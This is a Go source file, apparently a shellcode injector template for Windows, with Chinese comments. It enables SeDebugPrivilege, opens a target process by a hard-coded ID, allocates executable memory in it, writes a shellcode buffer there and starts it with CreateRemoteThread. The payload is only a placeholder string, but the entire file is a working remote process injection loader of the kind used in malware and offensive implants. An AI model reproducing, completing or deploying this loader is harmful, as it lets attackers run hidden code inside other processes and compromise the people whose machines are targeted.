package main

import (
	"syscall"
	"unsafe"
)
const SE_PRIVILEGE_ENABLED = 0x00000002
const PROCESS_ALL_ACCESS = 0x1F0FFF
const MEM_COMMIT = 0x00001000
const MEM_RESERVE = 0x00002000
const PAGE_EXECUTE_READWRITE = 0x40

type LUID struct {
	LowPart uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges [1]LUID_AND_ATTRIBUTES
}


var Kernel32 = syscall.NewLazyDLL("kernel32.dll")
var Apdvapi32 = syscall.NewLazyDLL("Advapi32.dll")
var OpenProcessToken = Apdvapi32.NewProc("OpenProcessToken")
var GetCurrentProcess = Kernel32.NewProc("GetCurrentProcess")
var LookupPrivilegeValue = Apdvapi32.NewProc("LookupPrivilegeValueW")
var AdjustTokenPrivileges = Apdvapi32.NewProc("AdjustTokenPrivileges")
var OpenProcess = Kernel32.NewProc("OpenProcess")
var VirtualAllocEx = Kernel32.NewProc("VirtualAllocEx")
var WriteProcessMemory = Kernel32.NewProc("WriteProcessMemory")
var CreateRemoteThread = Kernel32.NewProc("CreateRemoteThread")

var HandleToken syscall.Token
var TP TOKEN_PRIVILEGES
var NULL uintptr

func EnableDebugPrivilege(){
	CurrentHandle,_,_ := GetCurrentProcess.Call() // 获取当前进程的句柄
	OpenProcessToken.Call(CurrentHandle,syscall.TOKEN_ALL_ACCESS,uintptr(unsafe.Pointer(&HandleToken))) // 获取令牌权限
	TP.PrivilegeCount = 1
	TP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	SE_DEBUG_NAME, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
	LookupPrivilegeValue.Call(NULL,uintptr(unsafe.Pointer(SE_DEBUG_NAME)),uintptr(unsafe.Pointer(&TP.Privileges[0].Luid))) ////检索特权标识符所指定的特权名称，其中SE_DEBUG_NAME 为调试和调整另一个帐户拥有的进程的内存所必需。
	AdjustTokenPrivileges.Call(uintptr(HandleToken),uintptr(0),uintptr(unsafe.Pointer(&TP)),NULL,NULL)
}

func main(){
	var pid = 6876
	shellcode := []byte("123")
	EnableDebugPrivilege()
	hProcess , _, _ := OpenProcess.Call(uintptr(PROCESS_ALL_ACCESS),uintptr(0),uintptr(pid)) // 获取进程句柄
	VirtualAddress , _, _ := VirtualAllocEx.Call(hProcess,0,uintptr(len(shellcode)),uintptr(MEM_COMMIT)|uintptr(MEM_RESERVE),uintptr(PAGE_EXECUTE_READWRITE))
	WriteProcessMemory.Call(hProcess,VirtualAddress,uintptr(unsafe.Pointer(&shellcode[0])),uintptr(len(shellcode)),uintptr(0))
	CreateRemoteThread.Call(hProcess, 0, 0, VirtualAddress, 0, 0, 0)
	Kernel32.NewProc("CloseHandle").Call(hProcess)
}
